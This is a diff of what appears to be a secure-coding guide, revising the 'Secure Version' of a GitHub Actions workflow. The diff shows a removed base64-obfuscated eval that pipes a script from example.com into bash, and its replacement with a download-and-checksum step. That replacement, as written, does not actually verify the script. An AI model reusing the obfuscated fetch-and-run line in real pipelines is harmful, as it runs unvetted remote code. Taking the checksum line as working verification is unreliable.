@@ -44,19 +44,21 @@ jobs:
 
 ### Secure Version
 
-```yaml
-name: Clear Build
-on: [push]
-jobs:
-  build:
-    runs-on: ubuntu-latest
-    steps:
-      - uses: actions/checkout@v4
-      - name: Download and verify script
+```diff
+ name: Clear Build
+ on: [push]
+ jobs:
+   build:
+     runs-on: ubuntu-latest
+     steps:
++      - uses: actions/checkout@v4
++      - name: Download and verify script
         run: |
-          curl -o script.sh https://example.com/script.sh
-          echo "expected_sha256" | sha256sum -c
-          bash script.sh
+-          eval $(echo "Y3VybCBodHRwczovL2V4YW1wbGUuY29tL3NjcmlwdC5zaCB8IGJhc2g=" | base64 -d)
+-          # Decodes to: curl https://example.com/script.sh | bash
++          curl -o script.sh https://example.com/script.sh
++          echo "expected_sha256" | sha256sum -c
++          bash script.sh
 ```
 
 ## Impact
